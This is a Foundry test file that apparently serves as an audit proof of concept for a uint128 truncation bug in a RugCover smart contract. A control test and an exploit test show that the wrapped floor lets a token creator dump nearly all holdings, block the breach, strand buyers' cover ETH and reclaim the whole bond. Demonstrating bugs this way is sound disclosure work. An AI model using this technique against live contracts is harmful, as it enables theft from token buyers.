// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {MakerRegistry} from "../src/MakerRegistry.sol";
import {FeeDistributor} from "../src/FeeDistributor.sol";
import {StoaRouter, ISignatureTransfer} from "../src/StoaRouter.sol";
import {RugCover} from "../src/RugCover.sol";
import {MockToken, MockAdapter, MockWHYPE, MockPermit2} from "./mocks/Mocks.sol";
import {IMakerRegistry, IFeeDistributor} from "../src/interfaces/IStoa.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract HugeFactory {
    struct Launched { address token; address curve; address creator; address feeTo; uint256 extra; }
    mapping(address => Launched) internal _l;
    function set(address token, address cr) external {
        _l[token] = Launched(token, address(0xC0FFEE), cr, cr, 1);
    }
    function getLaunchedToken(address token) external view returns (Launched memory) { return _l[token]; }
}

/// @dev Controlled experiment. Two tests, IDENTICAL setup and identical attacker
///      behaviour. The ONLY variable is whether the creator's balance at open()
///      crosses 2**128 wei. If the sub-threshold control behaves correctly and the
///      over-threshold run does not, the uint128(bal) truncation at RugCover.sol:278
///      is the sole cause.
contract FloorTruncProof is Test {
    RugCover rc;
    StoaRouter router;
    MockToken stoa;
    MockToken tok;
    MockAdapter uni;
    HugeFactory factory;
    MockWHYPE weth;

    address gov = makeAddr("gov");
    address guardian = makeAddr("guardian");
    address keeper = makeAddr("keeper");
    address creator = makeAddr("creator");
    address buyer = makeAddr("buyer");
    address burner = makeAddr("burner");

    uint256 constant M = 1e18;
    uint256 constant U128MAX = type(uint128).max;      // 2**128 - 1
    uint256 constant WRAP = 2 ** 128;
    uint256 constant BOND = 5 ether;
    uint256 constant COVER = 1 ether;                  // buyer's stake, in [0.1, 2] ETH

    function _params() internal pure returns (RugCover.Params memory p) {
        p.term = 3 days;
        p.feeBps = 100;
        p.capacityBps = 5000;
        p.premiumBps = 100;
        p.walletCapBps = 10_000;
        p.bountyBps = 100;
        p.burnBps = 1000;
        p.minFloorBps = 1;                             // 0.01% of supply - easiest to satisfy
        p.minBond = 1 ether;
        p.maxBond = 10 ether;
        p.minCover = 0.1 ether;
        p.maxCover = 2 ether;
        p.maxTotalBonds = 100 ether;
        p.minFee = 0;
    }

    /// @dev creatorBal = exactly how much of `tok` the creator holds at open()
    function _boot(uint256 creatorBal) internal {
        vm.warp(1_795_000_000);
        weth = new MockWHYPE();
        stoa = new MockToken("STOA", 18);
        tok = new MockToken("HUGE", 18);
        MakerRegistry reg = new MakerRegistry(gov, gov, 3 days);
        FeeDistributor fees = new FeeDistributor(gov, IMakerRegistry(address(reg)));
        router = new StoaRouter(gov, IFeeDistributor(address(fees)), address(weth),
            ISignatureTransfer(address(new MockPermit2())), 1 days);
        uni = new MockAdapter(1000, 1);                // 1 ETH -> 1000 tok
        vm.startPrank(gov);
        router.addAdapter(address(uni));
        fees.setNotifier(address(router), true);
        vm.stopPrank();

        factory = new HugeFactory();
        factory.set(address(tok), creator);

        tok.mint(creator, creatorBal);
        tok.mint(address(uni), 5_000 * M);             // venue liquidity to pay the buyer
        stoa.mint(address(uni), 1_000 * M);

        rc = new RugCover(gov, router, IERC20(address(stoa)), address(factory),
                          guardian, keeper, _params());
        vm.deal(creator, 100 ether);
        vm.deal(buyer, 100 ether);
    }

    function _open() internal returns (uint256 id, uint256 floorStored, uint256 endsAt) {
        uint256 fee = rc.feeFor(BOND);
        vm.prank(creator);
        id = rc.open{value: BOND + fee}(address(tok), BOND);
        (, RugCover.Term memory t) = rc.latestTerm(address(tok));
        return (id, t.floor, t.endsAt);
    }

    function _buyCover() internal {
        uint256 prem = COVER * 100 / 10_000;
        StoaRouter.SwapParams memory s = StoaRouter.SwapParams({
            tokenIn: address(0), tokenOut: address(tok), mid: address(0),
            leg1: StoaRouter.Leg(address(uni), false), leg2: StoaRouter.Leg(address(0), false),
            amountIn: COVER, minOut: 0, to: buyer,
            deadline: block.timestamp + 1 hours, referrer: address(0)
        });
        vm.prank(buyer);
        rc.buyCovered{value: COVER + prem}(s);
    }

    /// @dev the attacker's move, BYTE-IDENTICAL in both runs: shed exactly
    ///      2**128 - 1 wei of tokens (the maximum the control can afford).
    uint256 constant DUMP = type(uint128).max;

    function _shedWrap() internal {
        vm.prank(creator);
        tok.transfer(burner, DUMP);
    }

    // ============================================================== CONTROL
    // creator balance at open = 2**128 - 1  (fits uint128, NO truncation)
    // Expected honest behaviour: shedding WRAP wei drops the creator below the
    // real floor -> breach SUCCEEDS -> buyer can claim the cover ETH back.
    function test_control_belowThreshold_breach_works() public {
        _boot(U128MAX);                                // 2**128 - 1 wei
        (uint256 id, uint256 floorStored, uint256 endsAt) = _open();
        _buyCover();

        assertEq(floorStored, U128MAX, "control: floor stored exactly, no truncation");
        assertEq(uint256(rc.coverOf(address(tok), id, buyer)), COVER, "control: buyer holds cover");

        _shedWrap();                                    // creator dumps 2**128 wei
        uint256 balAfter = tok.balanceOf(creator);
        emit log_named_uint("CONTROL  bal at open", U128MAX);
        emit log_named_uint("CONTROL  floor stored", floorStored);
        emit log_named_uint("CONTROL  bal after shed", balAfter);
        assertLt(balAfter, floorStored, "control: creator really fell below the floor");

        // breach works, buyers get paid
        rc.breach(address(tok));
        (, RugCover.Term memory tt) = rc.latestTerm(address(tok));
        assertEq(uint256(tt.status), 3, "control: term BREACHED");

        uint256 ethBefore = buyer.balance;
        vm.prank(buyer);
        uint256 got = rc.claim(address(tok), id, buyer);
        emit log_named_uint("CONTROL  buyer recovered ETH", got);
        assertEq(got, COVER, "control: buyer recovered the full cover");
        assertEq(buyer.balance - ethBefore, COVER, "control: ETH really moved to buyer");

        // creator cannot release: bond is forfeited to cover the buyers
        vm.warp(endsAt + rc.GRACE() + 1);
        vm.prank(creator);
        vm.expectRevert(RugCover.NoCover.selector);
        rc.release(address(tok), creator);
        emit log_string("CONTROL  -> breach fired, buyers paid, creator forfeited. CORRECT.");
    }

    // ============================================================== EXPLOIT
    // creator balance at open = 2**128 + 10e18  (ONE wei over the threshold)
    // Same attacker move, same everything else. floor wraps to 10e18 - 1.
    function test_exploit_aboveThreshold_breach_blocked() public {
        uint256 bal0 = WRAP + 10 * M;
        _boot(bal0);
        (uint256 id, uint256 floorStored, uint256 endsAt) = _open();
        _buyCover();

        emit log_named_uint("EXPLOIT  bal at open", bal0);
        emit log_named_uint("EXPLOIT  floor stored", floorStored);
        // THE TRUNCATION: stored floor is the low 128 bits, not the real balance
        assertEq(floorStored, 10 * M, "exploit: floor wrapped to bal0 mod 2**128");
        assertEq(floorStored, bal0 % WRAP, "exploit: floor == bal0 mod 2**128 exactly");
        assertGt(bal0 / floorStored, 1e19, "exploit: stored floor is >1e19x smaller than reality");
        assertEq(uint256(rc.coverOf(address(tok), id, buyer)), COVER, "exploit: buyer holds cover");

        _shedWrap();                                    // BYTE-IDENTICAL move to the control
        uint256 balAfter = tok.balanceOf(creator);
        emit log_named_uint("EXPLOIT  bal after shed", balAfter);
        emit log_named_uint("EXPLOIT  tokens shed", DUMP);
        // creator shed 2**128 - 1 wei and still "holds" the floor
        assertGe(balAfter, floorStored, "exploit: truncated floor still passes after the dump");
        assertEq(balAfter, 10 * M + 1, "exploit: creator kept only the wrapped remainder +1");

        // breach BLOCKED - the protection is dead
        vm.expectRevert(RugCover.NotBreached.selector);
        rc.breach(address(tok));
        emit log_string("EXPLOIT  -> breach reverted NotBreached despite a total rug");

        // buyer can never claim: claim requires status == BREACHED
        vm.prank(buyer);
        vm.expectRevert(RugCover.NotBreached.selector);
        rc.claim(address(tok), id, buyer);
        assertEq(uint256(rc.coverOf(address(tok), id, buyer)), COVER,
                 "exploit: buyer's cover ETH is stranded in the contract");

        // creator releases: walks away with the whole bond
        vm.warp(endsAt + rc.GRACE() + 1);
        vm.prank(creator);
        uint256 returned = rc.release(address(tok), creator);
        assertEq(returned, BOND, "exploit: creator recovered the entire bond after the rug");
        emit log_named_uint("EXPLOIT  bond returned to creator", returned);
        emit log_string("EXPLOIT  -> breach blocked, buyers stranded, creator paid. BUG CONFIRMED.");
    }
}
